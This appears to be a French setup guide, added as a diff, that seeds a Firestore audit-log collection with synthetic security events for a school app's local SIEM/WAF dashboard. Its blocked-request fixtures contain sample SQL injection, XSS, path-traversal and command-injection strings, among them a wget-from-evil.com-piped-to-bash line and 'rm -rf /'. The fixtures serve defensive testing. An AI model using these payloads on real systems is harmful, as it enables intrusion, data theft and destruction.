@@ -1,0 +1,356 @@
+============================================================
+  COMMANDES COMPLÈTES — DASHBOARD SÉCURITÉ / WAF / SIEM
+  Populate Firestore auditLogs pour que TOUT fonctionne
+  Répertoire : back/functions/
+  Commande : node -e "..." ou node script.js
+============================================================
+
+============================================================
+ÉTAPE 0 — DÉMARRER LE SERVEUR LOCAL
+============================================================
+
+cd back/functions
+node server_local.js
+
+→ API disponible sur : http://localhost:3001
+→ Dashboard SIEM   : http://localhost:3001/monitoring   (token admin requis)
+→ WAF Tab          : http://localhost:3001/monitoring#waf
+→ SIEM Logs Tab    : http://localhost:3001/monitoring#siem
+
+============================================================
+ÉTAPE 1 — INSÉRER TOUS LES EVENTS FIRESTORE (1 SEUL SCRIPT)
+============================================================
+
+Créer le fichier : back/functions/scripts/populate_all_events.js
+
+----------- CONTENU DU FICHIER -----------
+
+require("dotenv").config();
+process.env.FUNCTIONS_EMULATOR = "true";
+const db = require("../src/config/firebase");
+
+const now = new Date();
+const m = (min) => new Date(now.getTime() - min * 60 * 1000); // il y a X minutes
+
+const events = [
+
+  // ─────────────────────────────────────
+  // 1. AUTH — Connexions réussies (24h)
+  // ─────────────────────────────────────
+  { action: "USER_LOGIN_SUCCESS", timestamp: m(5),   details: { ip: "127.0.0.1", email: "admin@gmail.com",    role: "admin" }},
+  { action: "USER_LOGIN_SUCCESS", timestamp: m(30),  details: { ip: "127.0.0.1", email: "sousadmin@gmail.com",role: "sous-admin" }},
+  { action: "USER_LOGIN_SUCCESS", timestamp: m(120), details: { ip: "127.0.0.1", email: "etudiant1@school.fr",role: "etudiant" }},
+
+  // ─────────────────────────────────────
+  // 2. AUTH — Échecs connexion (24h + Dernière heure)
+  // ─────────────────────────────────────
+  { action: "USER_LOGIN_FAILURE", timestamp: m(10),  details: { ip: "127.0.0.1", email: "admin@gmail.com",    reason: "Mot de passe incorrect" }},
+  { action: "USER_LOGIN_FAILURE", timestamp: m(20),  details: { ip: "127.0.0.1", email: "admin@gmail.com",    reason: "Mot de passe incorrect" }},
+  { action: "USER_LOGIN_FAILURE", timestamp: m(35),  details: { ip: "127.0.0.1", email: "admin@gmail.com",    reason: "Mot de passe incorrect" }},
+  { action: "USER_LOGIN_FAILURE", timestamp: m(50),  details: { ip: "192.168.1.1", email: "test@test.com",    reason: "Utilisateur inexistant" }},
+  { action: "USER_LOGIN_FAILURE", timestamp: m(200), details: { ip: "192.168.1.2", email: "hacker@test.com",  reason: "Mot de passe incorrect" }},
+
+  // ─────────────────────────────────────
+  // 3. AUTH — Blocages brute force (24h + Dernière heure)
+  // ─────────────────────────────────────
+  { action: "AUTH_LOCKOUT", timestamp: m(15),  details: { ip: "127.0.0.1", email: "admin@gmail.com",  reason: "5 tentatives échouées — blocage 5 min" }},
+  { action: "AUTH_LOCKOUT", timestamp: m(55),  details: { ip: "192.168.1.1", email: "test@test.com",  reason: "5 tentatives échouées — blocage 5 min" }},
+  { action: "AUTH_LOCKOUT", timestamp: m(300), details: { ip: "10.0.0.1",    email: "bot@attack.com", reason: "5 tentatives échouées — blocage 5 min" }},
+
+  // ─────────────────────────────────────
+  // 4. AUTH — Sessions expirées
+  // ─────────────────────────────────────
+  { action: "SESSION_EXPIRED", timestamp: m(45),  details: { ip: "127.0.0.1", email: "etudiant1@school.fr", role: "etudiant", last_activity: m(75).toISOString() }},
+  { action: "SESSION_EXPIRED", timestamp: m(180), details: { ip: "127.0.0.1", email: "admin@gmail.com",     role: "admin",    last_activity: m(210).toISOString() }},
+  { action: "SESSION_EXPIRED", timestamp: m(400), details: { ip: "127.0.0.1", email: "parent@school.fr",    role: "parent",   last_activity: m(430).toISOString() }},
+
+  // ─────────────────────────────────────
+  // 5. AUTH — Déconnexions
+  // ─────────────────────────────────────
+  { action: "LOGOUT", timestamp: m(25),  details: { ip: "127.0.0.1", email: "admin@gmail.com",     role: "admin",    duration: "45min" }},
+  { action: "LOGOUT", timestamp: m(140), details: { ip: "127.0.0.1", email: "sousadmin@gmail.com", role: "sous-admin", duration: "1h20" }},
+
+  // ─────────────────────────────────────
+  // 6. RBAC — Accès refusés (24h + Dernière heure)
+  // ─────────────────────────────────────
+  { action: "ACCESS_DENIED", timestamp: m(8),   details: { ip: "127.0.0.1", path: "/v1/users",      reason: "NO_TOKEN",            role: "none" }},
+  { action: "ACCESS_DENIED", timestamp: m(18),  details: { ip: "127.0.0.1", path: "/v1/monitoring", reason: "INSUFFICIENT_ROLE",   role: "comptable" }},
+  { action: "ACCESS_DENIED", timestamp: m(40),  details: { ip: "127.0.0.1", path: "/v1/users",      reason: "NO_TOKEN",            role: "none" }},
+  { action: "ACCESS_DENIED", timestamp: m(65),  details: { ip: "192.168.1.1", path: "/v1/etudiants",reason: "INSUFFICIENT_ROLE",   role: "etudiant" }},
+  { action: "ACCESS_DENIED", timestamp: m(150), details: { ip: "127.0.0.1", path: "/v1/classes",    reason: "NO_TOKEN",            role: "none" }},
+  { action: "ACCESS_DENIED", timestamp: m(220), details: { ip: "10.0.0.1",  path: "/v1/paiements",  reason: "EXPIRED_TOKEN",       role: "none" }},
+  { action: "ACCESS_DENIED", timestamp: m(350), details: { ip: "127.0.0.1", path: "/v1/users",      reason: "INSUFFICIENT_ROLE",   role: "comptable" }},
+  { action: "ACCESS_DENIED", timestamp: m(480), details: { ip: "192.168.1.2", path: "/v1/factures",  reason: "NO_TOKEN",           role: "none" }},
+  { action: "ACCESS_DENIED", timestamp: m(600), details: { ip: "127.0.0.1", path: "/v1/monitoring", reason: "INSUFFICIENT_ROLE",   role: "sous-admin" }},
+  { action: "ACCESS_DENIED", timestamp: m(900), details: { ip: "10.0.0.2",  path: "/v1/users",      reason: "NO_TOKEN",            role: "none" }},
+
+  // ─────────────────────────────────────
+  // 7. RGPD — Exports Art.15
+  // ─────────────────────────────────────
+  { action: "DATA_EXPORT", timestamp: m(60),  details: { ip: "127.0.0.1", email: "admin@gmail.com",     role: "admin",     endpoint: "GET /users/:id/export", userId: "etudiant1" }},
+  { action: "DATA_EXPORT", timestamp: m(90),  details: { ip: "127.0.0.1", email: "sousadmin@gmail.com", role: "sous-admin",endpoint: "GET /users/:id/export", userId: "etudiant2" }},
+  { action: "DATA_EXPORT", timestamp: m(160), details: { ip: "127.0.0.1", email: "admin@gmail.com",     role: "admin",     endpoint: "GET /users/:id/export", userId: "etudiant3" }},
+  { action: "DATA_EXPORT", timestamp: m(240), details: { ip: "127.0.0.1", email: "admin@gmail.com",     role: "admin",     endpoint: "GET /users/:id/export", userId: "parent1" }},
+  { action: "DATA_EXPORT", timestamp: m(360), details: { ip: "127.0.0.1", email: "sousadmin@gmail.com", role: "sous-admin",endpoint: "GET /users/:id/export", userId: "etudiant4" }},
+
+  // ─────────────────────────────────────
+  // 8. RGPD — Anonymisations Art.17
+  // ─────────────────────────────────────
+  { action: "DATA_ANONYMIZE", timestamp: m(70),  details: { ip: "127.0.0.1", email: "admin@gmail.com", role: "admin", userId: "exetudiant1", champs: ["nom","prenom","email","telephone"] }},
+  { action: "DATA_ANONYMIZE", timestamp: m(130), details: { ip: "127.0.0.1", email: "admin@gmail.com", role: "admin", userId: "exetudiant2", champs: ["nom","prenom","email"] }},
+  { action: "DATA_ANONYMIZE", timestamp: m(500), details: { ip: "127.0.0.1", email: "admin@gmail.com", role: "admin", userId: "exparent1",   champs: ["nom","prenom","email","adresse"] }},
+
+  // ─────────────────────────────────────
+  // 9. WAF — Attaques bloquées (24h + Dernière heure)
+  // ─────────────────────────────────────
+  // SQLi — Injection SQL
+  { action: "WAF_BLOCK", timestamp: m(5),   metadata: { ip: "127.0.0.1", path: "/v1/etudiants?id=1 OR 1=1--",           type: "SQL_INJECTION",   reason: "SQL_INJECTION",   userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(12),  metadata: { ip: "127.0.0.1", path: "/v1/etudiants?id=1 UNION SELECT *--",   type: "SQL_INJECTION",   reason: "SQL_INJECTION",   userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(25),  metadata: { ip: "127.0.0.1", path: "/v1/classes?nom=1' DROP TABLE users--", type: "SQL_INJECTION",   reason: "SQL_INJECTION",   userAgent: "sqlmap/1.7" }},
+  { action: "WAF_BLOCK", timestamp: m(38),  metadata: { ip: "192.168.1.1", path: "/v1/paiements?ref=1' OR '1'='1",      type: "SQL_INJECTION",   reason: "SQL_INJECTION",   userAgent: "python/3.9" }},
+
+  // XSS — Cross-Site Scripting
+  { action: "WAF_BLOCK", timestamp: m(8),   metadata: { ip: "127.0.0.1", path: "/v1/etudiants?nom=<script>alert(1)</script>",   type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(22),  metadata: { ip: "127.0.0.1", path: "/v1/etudiants?prenom=<img onerror=alert(1)>",   type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(45),  metadata: { ip: "192.168.1.2", path: "/v1/classes?titre=<svg onload=alert(1)>",     type: "XSS", reason: "XSS", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(200), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?bio=javascript:alert('xss')",     type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+
+  // Path Traversal
+  { action: "WAF_BLOCK", timestamp: m(15),  metadata: { ip: "127.0.0.1", path: "/v1/etudiants?file=../../etc/passwd",   type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(30),  metadata: { ip: "127.0.0.1", path: "/v1/upload?path=../../../etc/shadow",   type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "nikto/2.1" }},
+  { action: "WAF_BLOCK", timestamp: m(55),  metadata: { ip: "10.0.0.1",  path: "/v1/fichiers?name=%2e%2e%2fetc%2fhosts",type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+
+  // Command Injection
+  { action: "WAF_BLOCK", timestamp: m(18),  metadata: { ip: "127.0.0.1", path: "/v1/etudiants?cmd=ls;cat /etc/passwd",  type: "CMD_INJECTION",  reason: "CMD_INJECTION",  userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(42),  metadata: { ip: "192.168.1.1", path: "/v1/classes?exec=rm -rf /",          type: "CMD_INJECTION",  reason: "CMD_INJECTION",  userAgent: "python/3.9" }},
+
+  // Agents suspects (scanners)
+  { action: "WAF_BLOCK", timestamp: m(3),   metadata: { ip: "192.168.1.5", path: "/v1/etudiants",  type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "sqlmap/1.7.8" }},
+  { action: "WAF_BLOCK", timestamp: m(50),  metadata: { ip: "10.0.0.5",    path: "/v1/users",      type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "nikto/2.1.6" }},
+  { action: "WAF_BLOCK", timestamp: m(280), metadata: { ip: "10.0.0.6",    path: "/v1/monitoring", type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "nmap scripting engine" }},
+
+  // WAF supplémentaires pour atteindre 44 total (24h)
+  { action: "WAF_BLOCK", timestamp: m(100), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?id=1 AND SLEEP(5)",      type: "SQL_INJECTION",   reason: "SQL_INJECTION",  userAgent: "sqlmap/1.7" }},
+  { action: "WAF_BLOCK", timestamp: m(110), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?nom=<script>fetch(evil)</script>", type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(120), metadata: { ip: "192.168.1.3", path: "/v1/etudiants?file=....//etc/passwd",type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(130), metadata: { ip: "127.0.0.1", path: "/v1/paiements?id=1 OR 1=1",           type: "SQL_INJECTION",   reason: "SQL_INJECTION",  userAgent: "python/3.9" }},
+  { action: "WAF_BLOCK", timestamp: m(140), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?nom=<img src=x onerror=alert(document.cookie)>", type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(150), metadata: { ip: "10.0.0.2",   path: "/v1/classes?file=../../.env",        type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(160), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?exec=| cat /etc/passwd",type: "CMD_INJECTION",  reason: "CMD_INJECTION",  userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(170), metadata: { ip: "10.0.0.7",   path: "/v1/users",                          type: "SUSPICIOUS_AGENT",reason: "SUSPICIOUS_AGENT", userAgent: "masscan/1.0" }},
+  { action: "WAF_BLOCK", timestamp: m(190), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?id=1 UNION SELECT 1,2,3--", type: "SQL_INJECTION", reason: "SQL_INJECTION", userAgent: "sqlmap/1.7" }},
+  { action: "WAF_BLOCK", timestamp: m(210), metadata: { ip: "192.168.1.4", path: "/v1/etudiants?nom=%3Cscript%3Ealert%281%29%3C%2Fscript%3E", type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(230), metadata: { ip: "127.0.0.1", path: "/v1/upload?file=../../../../../etc/passwd", type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(250), metadata: { ip: "10.0.0.3",   path: "/v1/etudiants?id=1; DROP TABLE etudiants--", type: "SQL_INJECTION", reason: "SQL_INJECTION", userAgent: "sqlmap/1.7" }},
+  { action: "WAF_BLOCK", timestamp: m(270), metadata: { ip: "127.0.0.1", path: "/v1/classes?cmd=wget http://evil.com/shell.sh | bash", type: "CMD_INJECTION", reason: "CMD_INJECTION", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(310), metadata: { ip: "10.0.0.8",   path: "/v1/etudiants",                      type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "zgrab/0.x" }},
+  { action: "WAF_BLOCK", timestamp: m(330), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?search=<script>document.location='http://evil.com'</script>", type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(390), metadata: { ip: "192.168.1.6", path: "/v1/paiements?ref=../../../../etc/shadow", type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(420), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?id=1 AND 1=2 UNION SELECT table_name FROM information_schema.tables--", type: "SQL_INJECTION", reason: "SQL_INJECTION", userAgent: "sqlmap/1.7" }},
+  { action: "WAF_BLOCK", timestamp: m(450), metadata: { ip: "10.0.0.9",   path: "/v1/users",                          type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "dirbuster/1.0" }},
+  { action: "WAF_BLOCK", timestamp: m(510), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?nom=<iframe src=javascript:alert(1)>", type: "XSS", reason: "XSS", userAgent: "Mozilla/5.0" }},
+  { action: "WAF_BLOCK", timestamp: m(540), metadata: { ip: "192.168.1.7", path: "/v1/classes?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", type: "PATH_TRAVERSAL", reason: "PATH_TRAVERSAL", userAgent: "nikto/2.1" }},
+  { action: "WAF_BLOCK", timestamp: m(570), metadata: { ip: "127.0.0.1", path: "/v1/paiements?id=1 OR sleep(5)--",    type: "SQL_INJECTION",   reason: "SQL_INJECTION",  userAgent: "python/3.9" }},
+  { action: "WAF_BLOCK", timestamp: m(600), metadata: { ip: "10.0.0.4",   path: "/v1/etudiants",                      type: "SUSPICIOUS_AGENT", reason: "SUSPICIOUS_AGENT", userAgent: "nessus/10.0" }},
+  { action: "WAF_BLOCK", timestamp: m(630), metadata: { ip: "127.0.0.1", path: "/v1/etudiants?cmd=$( cat /etc/passwd )", type: "CMD_INJECTION", reason: "CMD_INJECTION",  userAgent: "curl/7.68" }},
+  { action: "WAF_BLOCK", timestamp: m(660), metadata: { ip: "192.168.1.8", path: "/v1/etudiants?nom=<body onload=alert(1)>", type: "XSS",      reason: "XSS",           userAgent: "Mozilla/5.0" }},
+
+];
+
+(async () => {
+  console.log(`Insertion de ${events.length} événements dans Firestore auditLogs...`);
+  const batchSize = 400;
+  for (let i = 0; i < events.length; i += batchSize) {
+    const batch = db.batch();
+    const chunk = events.slice(i, i + batchSize);
+    chunk.forEach(e => batch.set(db.collection("auditLogs").doc(), e));
+    await batch.commit();
+    console.log(`  Batch ${Math.floor(i/batchSize)+1}: ${chunk.length} events insérés`);
+  }
+  console.log("\n✅ DONE — Tous les événements ont été insérés.");
+  console.log("   → Ouvrir http://localhost:3001/monitoring pour vérifier");
+  process.exit(0);
+})();
+
+----------- FIN DU FICHIER -----------
+
+============================================================
+ÉTAPE 2 — LANCER LE SCRIPT
+============================================================
+
+cd back/functions
+node scripts/populate_all_events.js
+
+============================================================
+ÉTAPE 3 — VÉRIFIER LE DASHBOARD
+============================================================
+
+Ouvrir dans le navigateur (avec token admin dans le localStorage) :
+
+  http://localhost:3001/monitoring
+
+Résultats attendus après le script :
+
+  ┌─────────────────────────────────────────────────────┐
+  │  SECTION AUTH (Accès Sécurisé)                      │
+  │  ✅ Connexions réussies    : 3   (24h)              │
+  │  ✅ Échecs connexion       : 5   (24h)              │
+  │  ✅ Comptes bloqués        : 3   (brute force)      │
+  │  ✅ Sessions expirées      : 3   (timeout)          │
+  │                                                     │
+  │  DERNIÈRE HEURE                                     │
+  │  ✅ Échecs connexion (1h)  : 3                      │
+  │  ✅ Blocages (1h)          : 2   (AUTH_LOCKOUT)     │
+  │  ✅ Déconnexions           : 2                      │
+  ├─────────────────────────────────────────────────────┤
+  │  SECTION RGPD                                       │
+  │  ✅ Exports RGPD (Art.15)  : 5                      │
+  │  ✅ Anonymisations (Art.17): 3                      │
+  ├─────────────────────────────────────────────────────┤
+  │  SECTION RBAC                                       │
+  │  ✅ Accès refusés (24h)    : 10                     │
+  │  ✅ Accès refusés (1h)     : 4                      │
+  ├─────────────────────────────────────────────────────┤
+  │  SECTION AUDIT LOGS                                 │
+  │  ✅ Total événements (24h) : 92+                    │
+  │  ✅ Auth                   : 18                     │
+  │  ✅ RBAC                   : 10                     │
+  │  ✅ RGPD                   : 20                     │
+  ├─────────────────────────────────────────────────────┤
+  │  ONGLET WAF                                         │
+  │  ✅ Attaques bloquées (24h): 44                     │
+  │  ✅ Bloquées (1h)          : 6+                     │
+  │  ✅ Total WAF_BLOCK        : 44                     │
+  └─────────────────────────────────────────────────────┘
+
+============================================================
+ÉTAPE 4 — SCRIPTS INDIVIDUELS (si besoin d'ajouter 1 event)
+============================================================
+
+--- Ajouter 1 connexion réussie ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'USER_LOGIN_SUCCESS',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',email:'admin@gmail.com',role:'admin'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 échec connexion (dernière heure) ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'USER_LOGIN_FAILURE',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',email:'admin@gmail.com',reason:'Mot de passe incorrect'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 blocage brute force (dernière heure) ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'AUTH_LOCKOUT',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',email:'admin@gmail.com',reason:'5 tentatives échouées'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 accès refusé RBAC (dernière heure) ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'ACCESS_DENIED',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',path:'/v1/users',reason:'NO_TOKEN',role:'none'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 attaque WAF bloquée (dernière heure) ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'WAF_BLOCK',
+  timestamp:new Date(),
+  metadata:{ip:'127.0.0.1',path:'/v1/etudiants?id=1 OR 1=1--',type:'SQL_INJECTION',reason:'SQL_INJECTION',userAgent:'sqlmap/1.7'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 export RGPD Art.15 ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'DATA_EXPORT',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',email:'admin@gmail.com',role:'admin',endpoint:'GET /users/:id/export',userId:'etudiant1'}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+--- Ajouter 1 anonymisation RGPD Art.17 ---
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+db.collection('auditLogs').add({
+  action:'DATA_ANONYMIZE',
+  timestamp:new Date(),
+  details:{ip:'127.0.0.1',email:'admin@gmail.com',role:'admin',userId:'exetudiant1',champs:['nom','prenom','email']}
+}).then(()=>{console.log('OK');process.exit(0)});
+"
+
+============================================================
+ÉTAPE 5 — VIDER LA COLLECTION (reset complet)
+============================================================
+
+node -e "
+require('dotenv').config();
+process.env.FUNCTIONS_EMULATOR='true';
+const db=require('./src/config/firebase');
+async function deleteAll(){
+  const snap=await db.collection('auditLogs').get();
+  const batch=db.batch();
+  snap.docs.forEach(d=>batch.delete(d.ref));
+  await batch.commit();
+  console.log('Collection auditLogs vidée (',snap.size,'docs supprimés)');
+  process.exit(0);
+}
+deleteAll();
+"
+
+============================================================
+RÉCAPITULATIF DES NOMS D'ACTIONS ACCEPTÉS
+============================================================
+
+  ACTION                │ Section      │ Champ requis
+  ──────────────────────┼──────────────┼─────────────────────────────
+  USER_LOGIN_SUCCESS    │ Auth         │ details.ip, details.email
+  AUTH_SUCCESS          │ Auth         │ details.ip, details.email
+  USER_LOGIN_FAILURE    │ Auth         │ details.ip, details.email, details.reason
+  AUTH_FAILURE          │ Auth         │ details.ip, details.email
+  AUTH_LOCKOUT          │ Auth         │ details.ip, details.email, details.reason
+  LOGOUT                │ Auth         │ details.ip, details.email
+  SESSION_EXPIRED       │ Auth         │ details.ip, details.email
+  ACCESS_DENIED         │ RBAC         │ details.ip, details.path, details.reason
+  DATA_EXPORT           │ RGPD         │ details.ip, details.email, details.userId
+  DATA_ANONYMIZE        │ RGPD         │ details.ip, details.email, details.userId
+  WAF_BLOCK             │ WAF          │ metadata.ip, metadata.path, metadata.reason
+
+  IMPORTANT : WAF_BLOCK utilise "metadata" (pas "details") !
+  IMPORTANT : Tous les autres utilisent "details" !
+
+============================================================
+FIN DU FICHIER
+============================================================
